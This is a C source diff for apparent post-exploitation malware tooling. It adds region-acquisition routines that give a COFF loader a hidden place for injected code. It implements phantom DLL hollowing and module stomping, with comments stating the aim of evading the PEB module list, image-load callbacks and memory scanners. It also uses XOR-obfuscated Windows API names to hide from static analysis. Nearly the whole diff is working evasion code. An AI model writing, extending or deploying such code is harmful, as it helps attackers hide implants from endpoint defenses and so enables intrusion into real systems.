@@ -416,6 +416,192 @@ BOOL postex_load(const unsigned char *payload, SIZE_T payloadLen,
     }
 }
 
+/* ═══════════════════════════════════════════════════════════════════
+ *  Region acquisition — for COFF loader integration.
+ *
+ *  Returns a writable, image-backed region that the COFF loader uses
+ *  for .text section allocation. The caller copies data, applies
+ *  relocations, then sets RX in the normal Step 7.
+ * ═══════════════════════════════════════════════════════════════════ */
+
+BOOL postex_acquire_region(SIZE_T minSize, STOMP_REGION *region) {
+    if (!region) return FALSE;
+    memset(region, 0, sizeof(*region));
+
+    const wchar_t *dllPath = postex_select_stomp_dll(minSize);
+    if (!dllPath) return FALSE;
+
+#if CONFIG_PHANTOM_HOLLOW
+    /* ── Phantom DLL Hollowing path ──
+     * NtCreateSection(SEC_IMAGE) + NtMapViewOfSection.
+     * Not in PEB module list, no image-load callback. */
+
+    /* Resolve Nt functions (XOR-obfuscated) */
+    char _sn[] = {'n'^0x5A,'t'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,0};
+    for(int _i=0;_sn[_i];_i++) _sn[_i]^=0x5A;
+    HMODULE hNtdll = GetModuleHandleA(_sn);
+    SecureZeroMemory(_sn, sizeof(_sn));
+    if (!hNtdll) return FALSE;
+
+    char _sf1[] = {'N'^0x5A,'t'^0x5A,'C'^0x5A,'r'^0x5A,'e'^0x5A,'a'^0x5A,'t'^0x5A,'e'^0x5A,'S'^0x5A,'e'^0x5A,'c'^0x5A,'t'^0x5A,'i'^0x5A,'o'^0x5A,'n'^0x5A,0};
+    for(int _i=0;_sf1[_i];_i++) _sf1[_i]^=0x5A;
+    pfnNtCreateSection pNtCS = (pfnNtCreateSection)GetProcAddress(hNtdll, _sf1);
+    SecureZeroMemory(_sf1, sizeof(_sf1));
+
+    char _sf2[] = {'N'^0x5A,'t'^0x5A,'M'^0x5A,'a'^0x5A,'p'^0x5A,'V'^0x5A,'i'^0x5A,'e'^0x5A,'w'^0x5A,'O'^0x5A,'f'^0x5A,'S'^0x5A,'e'^0x5A,'c'^0x5A,'t'^0x5A,'i'^0x5A,'o'^0x5A,'n'^0x5A,0};
+    for(int _i=0;_sf2[_i];_i++) _sf2[_i]^=0x5A;
+    pfnNtMapViewOfSection pNtMVS = (pfnNtMapViewOfSection)GetProcAddress(hNtdll, _sf2);
+    SecureZeroMemory(_sf2, sizeof(_sf2));
+
+    if (!pNtCS || !pNtMVS) return FALSE;
+
+    /* Open sacrificial DLL file */
+    HANDLE hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ,
+                                NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
+
+    /* Create image section */
+    HANDLE hSection = NULL;
+    NTSTATUS status = pNtCS(&hSection, SECTION_ALL_ACCESS, NULL,
+                             NULL, PAGE_READONLY, SEC_IMAGE, hFile);
+    CloseHandle(hFile);
+    if (!NT_SUCCESS(status) || !hSection) return FALSE;
+
+    /* Map into our process */
+    void *viewBase = NULL;
+    SIZE_T viewSize = 0;
+    status = pNtMVS(hSection, GetCurrentProcess(), &viewBase, 0, 0,
+                     NULL, &viewSize, 1 /* ViewShare */, 0, PAGE_READWRITE);
+    CloseHandle(hSection);
+    if (!NT_SUCCESS(status) || !viewBase) return FALSE;
+
+    /* Find .text section in mapped view */
+    unsigned char *base = (unsigned char *)viewBase;
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
+        /* resolve NtUnmapViewOfSection and unmap */
+        char _sf3[] = {'N'^0x5A,'t'^0x5A,'U'^0x5A,'n'^0x5A,'m'^0x5A,'a'^0x5A,'p'^0x5A,
+                       'V'^0x5A,'i'^0x5A,'e'^0x5A,'w'^0x5A,'O'^0x5A,'f'^0x5A,
+                       'S'^0x5A,'e'^0x5A,'c'^0x5A,'t'^0x5A,'i'^0x5A,'o'^0x5A,'n'^0x5A,0};
+        for(int _i=0;_sf3[_i];_i++) _sf3[_i]^=0x5A;
+        pfnNtUnmapViewOfSection pNtUVS = (pfnNtUnmapViewOfSection)GetProcAddress(hNtdll, _sf3);
+        SecureZeroMemory(_sf3, sizeof(_sf3));
+        if (pNtUVS) pNtUVS(GetCurrentProcess(), viewBase);
+        return FALSE;
+    }
+
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
+    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(nt);
+    WORD numSec = nt->FileHeader.NumberOfSections;
+    void *textAddr = NULL;
+    DWORD textSize = 0;
+
+    for (WORD i = 0; i < numSec; i++) {
+        if (memcmp(pSec[i].Name, ".text", 5) == 0) {
+            textAddr = base + pSec[i].VirtualAddress;
+            textSize = pSec[i].Misc.VirtualSize;
+            break;
+        }
+    }
+
+    if (!textAddr || textSize < minSize) {
+        char _sf3[] = {'N'^0x5A,'t'^0x5A,'U'^0x5A,'n'^0x5A,'m'^0x5A,'a'^0x5A,'p'^0x5A,
+                       'V'^0x5A,'i'^0x5A,'e'^0x5A,'w'^0x5A,'O'^0x5A,'f'^0x5A,
+                       'S'^0x5A,'e'^0x5A,'c'^0x5A,'t'^0x5A,'i'^0x5A,'o'^0x5A,'n'^0x5A,0};
+        for(int _i=0;_sf3[_i];_i++) _sf3[_i]^=0x5A;
+        pfnNtUnmapViewOfSection pNtUVS = (pfnNtUnmapViewOfSection)GetProcAddress(hNtdll, _sf3);
+        SecureZeroMemory(_sf3, sizeof(_sf3));
+        if (pNtUVS) pNtUVS(GetCurrentProcess(), viewBase);
+        return FALSE;
+    }
+
+    /* Make writable */
+    DWORD oldProt;
+    if (!VirtualProtect(textAddr, textSize, PAGE_READWRITE, &oldProt)) {
+        char _sf3[] = {'N'^0x5A,'t'^0x5A,'U'^0x5A,'n'^0x5A,'m'^0x5A,'a'^0x5A,'p'^0x5A,
+                       'V'^0x5A,'i'^0x5A,'e'^0x5A,'w'^0x5A,'O'^0x5A,'f'^0x5A,
+                       'S'^0x5A,'e'^0x5A,'c'^0x5A,'t'^0x5A,'i'^0x5A,'o'^0x5A,'n'^0x5A,0};
+        for(int _i=0;_sf3[_i];_i++) _sf3[_i]^=0x5A;
+        pfnNtUnmapViewOfSection pNtUVS = (pfnNtUnmapViewOfSection)GetProcAddress(hNtdll, _sf3);
+        SecureZeroMemory(_sf3, sizeof(_sf3));
+        if (pNtUVS) pNtUVS(GetCurrentProcess(), viewBase);
+        return FALSE;
+    }
+
+    memset(textAddr, 0, textSize);
+    region->base = textAddr;
+    region->size = textSize;
+    region->viewBase = viewBase;
+    return TRUE;
+
+#else  /* CONFIG_MODULE_STOMP (default) */
+    /* ── Module Stomping path ──
+     * LoadLibraryExW(DONT_RESOLVE_DLL_REFERENCES) → stomp .text.
+     * Payload attributed to legitimate DLL in memory scanners. */
+
+    HMODULE hMod = LoadLibraryExW(dllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
+    if (!hMod) return FALSE;
+
+    void *textBase;
+    DWORD textSize;
+    if (!postex_get_text_section(hMod, &textBase, &textSize) ||
+        textSize < minSize)
+    {
+        FreeLibrary(hMod);
+        return FALSE;
+    }
+
+    DWORD oldProt;
+    if (!VirtualProtect(textBase, textSize, PAGE_READWRITE, &oldProt)) {
+        FreeLibrary(hMod);
+        return FALSE;
+    }
+
+    memset(textBase, 0, textSize);
+    region->base = textBase;
+    region->size = textSize;
+    region->hMod = hMod;
+    return TRUE;
+#endif
+}
+
+void postex_release_region(STOMP_REGION *region) {
+    if (!region) return;
+
+    if (region->base && region->size > 0) {
+        DWORD oldProt;
+        if (VirtualProtect(region->base, region->size,
+                           PAGE_READWRITE, &oldProt))
+        {
+            SecureZeroMemory(region->base, region->size);
+        }
+    }
+
+    if (region->hMod) {
+        FreeLibrary(region->hMod);
+    }
+
+    if (region->viewBase) {
+        /* Phantom hollow cleanup — unmap the view */
+        char _sn[] = {'n'^0x5A,'t'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,0};
+        for(int _i=0;_sn[_i];_i++) _sn[_i]^=0x5A;
+        HMODULE hNtdll = GetModuleHandleA(_sn);
+        SecureZeroMemory(_sn, sizeof(_sn));
+        if (hNtdll) {
+            char _sf[] = {'N'^0x5A,'t'^0x5A,'U'^0x5A,'n'^0x5A,'m'^0x5A,'a'^0x5A,'p'^0x5A,
+                          'V'^0x5A,'i'^0x5A,'e'^0x5A,'w'^0x5A,'O'^0x5A,'f'^0x5A,
+                          'S'^0x5A,'e'^0x5A,'c'^0x5A,'t'^0x5A,'i'^0x5A,'o'^0x5A,'n'^0x5A,0};
+            for(int _i=0;_sf[_i];_i++) _sf[_i]^=0x5A;
+            pfnNtUnmapViewOfSection pNtUVS =
+                (pfnNtUnmapViewOfSection)GetProcAddress(hNtdll, _sf);
+            SecureZeroMemory(_sf, sizeof(_sf));
+            if (pNtUVS) pNtUVS(GetCurrentProcess(), region->viewBase);
+        }
+    }
+
+    memset(region, 0, sizeof(*region));
+}
+
 void postex_unload(LOAD_RESULT *result) {
     if (!result) return;
 
